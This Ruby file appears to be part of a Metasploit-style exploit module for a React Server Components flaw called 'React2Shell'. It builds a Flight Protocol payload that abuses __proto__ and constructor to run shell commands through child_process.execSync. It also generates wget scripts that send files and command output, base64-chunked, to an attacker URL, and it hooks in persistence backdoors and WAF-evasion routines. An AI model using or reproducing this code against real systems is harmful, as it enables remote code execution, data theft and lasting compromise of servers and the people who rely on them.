# frozen_string_literal: true

require 'json'
require 'securerandom'
require_relative 'error_handler'
require_relative 'payload_evasion'

module React2Shell
  ##
  # PayloadGenerator - Generates Flight Protocol payloads for React2Shell exploitation
  # Handles JavaScript payload escaping and different payload types
  class PayloadGenerator
    attr_reader :error_handler, :payload_evasion

    def initialize(msf_module = nil)
      @msf_module = msf_module
      @error_handler = ErrorHandler.new(msf_module) if msf_module
      @payload_evasion = PayloadEvasion.new(msf_module)
    end
    ##
    # Generates a Flight Protocol chunk with embedded JavaScript payload
    # @param javascript_payload [String] JavaScript code to execute
    # @return [String] JSON-encoded Flight Protocol chunk
    def generate_flight_chunk(javascript_payload)
      begin
        # Validate input parameters
        raise ArgumentError, "JavaScript payload cannot be nil" if javascript_payload.nil?
        raise ArgumentError, "JavaScript payload cannot be empty" if javascript_payload.empty?
        
        # Escape the JavaScript payload for safe embedding
        escaped_payload = escape_javascript(javascript_payload)
        
        # Validate escaped payload
        unless validate_payload(escaped_payload)
          raise ArgumentError, "Payload validation failed - contains unbalanced quotes or invalid syntax"
        end
        
        chunk = {
          "then" => "$1:__proto__:then",
          "status" => "resolved_model", 
          "reason" => -1,
          "value" => '{"then":"$B0"}',
          "_response" => {
            "_prefix" => "process.mainModule.require('child_process').execSync('#{escaped_payload}');",
            "_formData" => {
              "get" => "$1:constructor:constructor"
            }
          }
        }
        
        chunk.to_json
        
      rescue => e
        if @error_handler
          @error_handler.handle_payload_error(e, :flight_chunk, { javascript_payload: javascript_payload })
        end
        raise e
      end
    end

    ##
    # Creates payload for file exfiltration via wget
    # @param filepath [String] Path to file to exfiltrate
    # @param oob_url [String] URL for OOB callback
    # @param options [Hash] Options including :chunk_size for large files
    # @return [String] Shell command for file exfiltration
    def create_file_exfiltration_payload(filepath, oob_url, options = {})
      begin
        # Validate input parameters
        raise ArgumentError, "Filepath cannot be nil or empty" if filepath.nil? || filepath.empty?
        raise ArgumentError, "OOB URL cannot be nil or empty" if oob_url.nil? || oob_url.empty?
        raise ArgumentError, "Filepath must be absolute (start with /)" unless filepath.start_with?('/')
        
        # Validate URL format
        begin
          uri = URI.parse(oob_url)
          raise ArgumentError, "Invalid URL scheme" unless ['http', 'https'].include?(uri.scheme)
        rescue URI::InvalidURIError => e
          raise ArgumentError, "Invalid OOB URL format: #{e.message}"
        end
        
        # Validate and escape filepath
        escaped_filepath = escape_shell_parameter(filepath)
        escaped_url = escape_shell_parameter(oob_url)
        
        # Check if chunked transfer is requested for large files
        if options[:chunk_size] && options[:chunk_size] > 0
          create_chunked_file_exfiltration_payload(escaped_filepath, escaped_url, options[:chunk_size])
        else
          "wget --post-file=#{escaped_filepath} #{escaped_url}"
        end
        
      rescue => e
        if @error_handler
          @error_handler.handle_payload_error(e, :file_exfiltration, { 
            filepath: filepath, 
            oob_url: oob_url,
            options: options
          })
        end
        raise e
      end
    end

    ##
    # Creates payload for command execution with output exfiltration
    # @param command [String] Command to execute
    # @param oob_url [String] URL for OOB callback
    # @param options [Hash] Options including :chunk_size for large outputs
    # @return [String] Shell command for execution and output exfiltration
    def create_command_execution_payload(command, oob_url, options = {})
      begin
        # Validate input parameters
        raise ArgumentError, "Command cannot be nil or empty" if command.nil? || command.empty?
        raise ArgumentError, "OOB URL cannot be nil or empty" if oob_url.nil? || oob_url.empty?
        
        # Validate URL format
        begin
          uri = URI.parse(oob_url)
          raise ArgumentError, "Invalid URL scheme" unless ['http', 'https'].include?(uri.scheme)
        rescue URI::InvalidURIError => e
          raise ArgumentError, "Invalid OOB URL format: #{e.message}"
        end
        
        # Check for potentially dangerous commands
        dangerous_patterns = [
          /rm\s+-rf\s+\//, # rm -rf /
          /:\(\)\{.*\}/, # fork bomb
          /mkfs/, # format filesystem
          /dd.*\/dev\/[sh]d/ # disk operations
        ]
        
        if dangerous_patterns.any? { |pattern| command =~ pattern }
          @msf_module&.print_warning("Command contains potentially dangerous operations")
        end
        
        # Escape command and URL for safe shell execution
        escaped_command = escape_shell_parameter(command)
        escaped_url = escape_shell_parameter(oob_url)
        
        # Check if chunked transfer is requested for large outputs
        if options[:chunk_size] && options[:chunk_size] > 0
          create_chunked_command_execution_payload(escaped_command, escaped_url, options[:chunk_size])
        else
          # Create command that executes and sends output via wget POST
          %Q{bash -c '#{escaped_command} | wget --post-data="CMD_OUTPUT:$(cat)" #{escaped_url}'}
        end
        
      rescue => e
        if @error_handler
          @error_handler.handle_payload_error(e, :command_execution, { 
            command: command, 
            oob_url: oob_url,
            options: options
          })
        end
        raise e
      end
    end

    ##
    # Escapes JavaScript code for safe embedding in JSON strings
    # @param payload [String] JavaScript code to escape
    # @return [String] Escaped JavaScript code
    def escape_javascript(payload)
      return '' if payload.nil?
      
      payload.gsub("'", "\\\\'")
             .gsub('"', '\\"')
             .gsub("\n", '\\n')
             .gsub("\r", '\\r')
             .gsub("\t", '\\t')
    end

    ##
    # Escapes shell parameters to prevent injection
    # @param parameter [String] Shell parameter to escape
    # @return [String] Escaped shell parameter
    def escape_shell_parameter(parameter)
      return '' if parameter.nil?
      
      # Basic shell escaping - wrap in single quotes and escape existing single quotes
      parameter.gsub("'", "'\"'\"'")
    end

    ##
    # Creates adaptive file exfiltration payload with automatic fallback mechanisms
    # @param filepath [String] Path to file to exfiltrate
    # @param oob_url [String] URL for OOB callback
    # @param options [Hash] Additional options for evasion and adaptation
    # @return [Array<String>] Array of alternative payloads to try
    def create_adaptive_file_exfiltration_payload(filepath, oob_url, options = {})
      @payload_evasion.create_adaptive_file_exfiltration_payload(filepath, oob_url, options)
    end

    ##
    # Creates adaptive command execution payload with automatic fallback mechanisms
    # @param command [String] Command to execute
    # @param oob_url [String] URL for OOB callback
    # @param options [Hash] Additional options for evasion and adaptation
    # @return [Array<String>] Array of alternative payloads to try
    def create_adaptive_command_execution_payload(command, oob_url, options = {})
      @payload_evasion.create_adaptive_command_execution_payload(command, oob_url, options)
    end

    ##
    # Creates persistence payload that establishes backdoors
    # @param oob_url [String] URL for callback
    # @param options [Hash] Persistence options
    # @return [Array<String>] Persistence payloads
    def create_persistence_payload(oob_url, options = {})
      @payload_evasion.create_persistence_payload(oob_url, options)
    end

    ##
    # Applies WAF bypass and anti-detection techniques to a payload
    # @param payload [String] Original payload
    # @param techniques [Array<Symbol>] Evasion techniques to apply
    # @return [Array<String>] Modified payloads with evasion
    def apply_evasion_techniques(payload, techniques = [:case_variation, :whitespace_variation])
      @payload_evasion.apply_evasion_techniques([payload], techniques)
    end

    ##
    # Detects environment restrictions and suggests best payload approach
    # @param test_commands [Array<String>] Commands to test for availability
    # @return [Hash] Detection results and recommendations
    def detect_environment_restrictions(test_commands = ['wget', 'curl', 'nc', 'python'])
      restrictions = @payload_evasion.detect_environment_restrictions(test_commands)
      
      # Log findings if module is available
      if @msf_module
        @msf_module.print_status("Environment detection results:")
        @msf_module.print_status("  Available commands: #{restrictions[:available_commands].join(', ')}")
        @msf_module.print_status("  Blocked commands: #{restrictions[:blocked_commands].join(', ')}")
        @msf_module.print_status("  Shell type: #{restrictions[:shell_type]}")
      end
      
      restrictions
    end

    ##
    # Creates file exfiltration payload with automatic method selection
    # Tries multiple methods until one succeeds or all fail
    # @param filepath [String] Path to file to exfiltrate
    # @param oob_url [String] URL for OOB callback
    # @param options [Hash] Options including :try_alternatives, :evasion, :stealth
    # @return [String] Best available payload method
    def create_adaptive_file_payload(filepath, oob_url, options = {})
      begin
        # If alternatives are disabled, use original method
        unless options[:try_alternatives]
          return create_file_exfiltration_payload(filepath, oob_url)
        end
        
        # Get all alternative payloads
        alternatives = create_adaptive_file_exfiltration_payload(filepath, oob_url, options)
        
        # Return the first (most preferred) alternative
        alternatives.first || create_file_exfiltration_payload(filepath, oob_url)
        
      rescue => e
        if @error_handler
          @error_handler.handle_payload_error(e, :adaptive_file_payload, { 
            filepath: filepath, 
            oob_url: oob_url,
            options: options
          })
        end
        
        # Fallback to original method
        create_file_exfiltration_payload(filepath, oob_url)
      end
    end

    ##
    # Creates command execution payload with automatic method selection
    # Tries multiple methods until one succeeds or all fail
    # @param command [String] Command to execute
    # @param oob_url [String] URL for OOB callback
    # @param options [Hash] Options including :try_alternatives, :evasion, :stealth
    # @return [String] Best available payload method
    def create_adaptive_command_payload(command, oob_url, options = {})
      begin
        # If alternatives are disabled, use original method
        unless options[:try_alternatives]
          return create_command_execution_payload(command, oob_url)
        end
        
        # Get all alternative payloads
        alternatives = create_adaptive_command_execution_payload(command, oob_url, options)
        
        # Return the first (most preferred) alternative
        alternatives.first || create_command_execution_payload(command, oob_url)
        
      rescue => e
        if @error_handler
          @error_handler.handle_payload_error(e, :adaptive_command_payload, { 
            command: command, 
            oob_url: oob_url,
            options: options
          })
        end
        
        # Fallback to original method
        create_command_execution_payload(command, oob_url)
      end
    end

    ##
    # Creates chunked file exfiltration payload for large files
    # @param escaped_filepath [String] Escaped file path
    # @param escaped_url [String] Escaped OOB URL
    # @param chunk_size [Integer] Size of each chunk in bytes
    # @return [String] Shell command for chunked file exfiltration
    def create_chunked_file_exfiltration_payload(escaped_filepath, escaped_url, chunk_size)
      chunk_id = SecureRandom.hex(4)
      
      # Create a complex shell script that splits the file and sends chunks
      script = <<~SCRIPT
        bash -c '
        FILE=#{escaped_filepath}
        URL=#{escaped_url}
        CHUNK_SIZE=#{chunk_size}
        CHUNK_ID=#{chunk_id}
        
        if [ ! -f "$FILE" ]; then
          wget --post-data="ERROR:File not found: $FILE" "$URL"
          exit 1
        fi
        
        FILE_SIZE=$(wc -c < "$FILE")
        TOTAL_CHUNKS=$(( (FILE_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE ))
        
        echo "Transferring $FILE ($FILE_SIZE bytes) in $TOTAL_CHUNKS chunks"
        
        for i in $(seq 0 $((TOTAL_CHUNKS - 1))); do
          OFFSET=$((i * CHUNK_SIZE))
          CHUNK_DATA=$(dd if="$FILE" bs=$CHUNK_SIZE skip=$i count=1 2>/dev/null | base64 -w 0)
          
          CHUNK_HEADER="CHUNK:$CHUNK_ID:$i:$TOTAL_CHUNKS:$FILE_SIZE"
          POST_DATA="$CHUNK_HEADER:$CHUNK_DATA"
          
          wget --post-data="$POST_DATA" "$URL" -O /dev/null -q
          
          if [ $? -eq 0 ]; then
            echo "Sent chunk $((i + 1))/$TOTAL_CHUNKS"
          else
            echo "Failed to send chunk $((i + 1))"
            break
          fi
        done
        '
      SCRIPT
      
      script.strip
    end

    ##
    # Creates chunked command execution payload for large outputs
    # @param escaped_command [String] Escaped command
    # @param escaped_url [String] Escaped OOB URL
    # @param chunk_size [Integer] Size of each chunk in bytes
    # @return [String] Shell command for chunked command execution
    def create_chunked_command_execution_payload(escaped_command, escaped_url, chunk_size)
      chunk_id = SecureRandom.hex(4)
      
      # Create a shell script that executes command and sends output in chunks
      script = <<~SCRIPT
        bash -c '
        CMD=#{escaped_command}
        URL=#{escaped_url}
        CHUNK_SIZE=#{chunk_size}
        CHUNK_ID=#{chunk_id}
        TEMP_FILE="/tmp/cmd_output_$$"
        
        # Execute command and capture output
        eval "$CMD" > "$TEMP_FILE" 2>&1
        CMD_EXIT_CODE=$?
        
        if [ $CMD_EXIT_CODE -ne 0 ]; then
          wget --post-data="ERROR:Command failed with exit code $CMD_EXIT_CODE" "$URL" -O /dev/null -q
        fi
        
        if [ ! -f "$TEMP_FILE" ] || [ ! -s "$TEMP_FILE" ]; then
          wget --post-data="CMD_OUTPUT:No output generated" "$URL" -O /dev/null -q
          rm -f "$TEMP_FILE"
          exit 0
        fi
        
        OUTPUT_SIZE=$(wc -c < "$TEMP_FILE")
        TOTAL_CHUNKS=$(( (OUTPUT_SIZE + CHUNK_SIZE - 1) / CHUNK_SIZE ))
        
        echo "Transferring command output ($OUTPUT_SIZE bytes) in $TOTAL_CHUNKS chunks"
        
        for i in $(seq 0 $((TOTAL_CHUNKS - 1))); do
          OFFSET=$((i * CHUNK_SIZE))
          CHUNK_DATA=$(dd if="$TEMP_FILE" bs=$CHUNK_SIZE skip=$i count=1 2>/dev/null | base64 -w 0)
          
          CHUNK_HEADER="CMD_CHUNK:$CHUNK_ID:$i:$TOTAL_CHUNKS:$OUTPUT_SIZE"
          POST_DATA="$CHUNK_HEADER:$CHUNK_DATA"
          
          wget --post-data="$POST_DATA" "$URL" -O /dev/null -q
          
          if [ $? -eq 0 ]; then
            echo "Sent chunk $((i + 1))/$TOTAL_CHUNKS"
          else
            echo "Failed to send chunk $((i + 1))"
            break
          fi
        done
        
        rm -f "$TEMP_FILE"
        '
      SCRIPT
      
      script.strip
    end

    ##
    # Creates payload for large data handling with automatic chunking
    # @param data_source [String] Source of data (file path or command)
    # @param oob_url [String] URL for OOB callback
    # @param data_type [Symbol] Type of data (:file or :command)
    # @param options [Hash] Options including :max_size, :chunk_size
    # @return [String] Appropriate payload based on expected data size
    def create_large_data_payload(data_source, oob_url, data_type, options = {})
      max_size = options[:max_size] || 1024 * 1024  # 1MB default threshold
      chunk_size = options[:chunk_size] || 64 * 1024  # 64KB default chunk size
      
      case data_type
      when :file
        # For files, we can check size first and decide on chunking
        size_check_payload = create_file_size_check_payload(data_source, oob_url, max_size, chunk_size)
        size_check_payload
      when :command
        # For commands, we don't know output size in advance, so use chunking by default
        create_command_execution_payload(data_source, oob_url, { chunk_size: chunk_size })
      else
        raise ArgumentError, "Unsupported data type: #{data_type}"
      end
    end

    ##
    # Creates payload that checks file size and uses appropriate transfer method
    # @param filepath [String] Path to file
    # @param oob_url [String] OOB callback URL
    # @param max_size [Integer] Maximum size for direct transfer
    # @param chunk_size [Integer] Chunk size for large files
    # @return [String] Shell command with size-based logic
    def create_file_size_check_payload(filepath, oob_url, max_size, chunk_size)
      escaped_filepath = escape_shell_parameter(filepath)
      escaped_url = escape_shell_parameter(oob_url)
      
      script = <<~SCRIPT
        bash -c '
        FILE=#{escaped_filepath}
        URL=#{escaped_url}
        MAX_SIZE=#{max_size}
        CHUNK_SIZE=#{chunk_size}
        
        if [ ! -f "$FILE" ]; then
          wget --post-data="ERROR:File not found: $FILE" "$URL" -O /dev/null -q
          exit 1
        fi
        
        FILE_SIZE=$(wc -c < "$FILE")
        
        if [ $FILE_SIZE -le $MAX_SIZE ]; then
          # Small file - direct transfer
          wget --post-file="$FILE" "$URL" -O /dev/null -q
        else
          # Large file - chunked transfer
          #{create_chunked_file_exfiltration_payload(escaped_filepath, escaped_url, chunk_size).gsub(/^bash -c '/, '').gsub(/'$/, '')}
        fi
        '
      SCRIPT
      
      script.strip
    end

    ##
    # Validates that a payload is syntactically correct
    # @param payload [String] Payload to validate
    # @return [Boolean] True if payload appears valid
    def validate_payload(payload)
      return false if payload.nil? || payload.empty?
      
      # Basic validation - check for balanced quotes
      # Count unescaped quotes by removing escaped ones first
      temp_payload = payload.gsub("\\'", "").gsub('\\"', "")
      single_quotes = temp_payload.count("'")
      double_quotes = temp_payload.count('"')
      
      # Should have even number of unescaped quotes
      single_quotes.even? && double_quotes.even?
    end
  end
end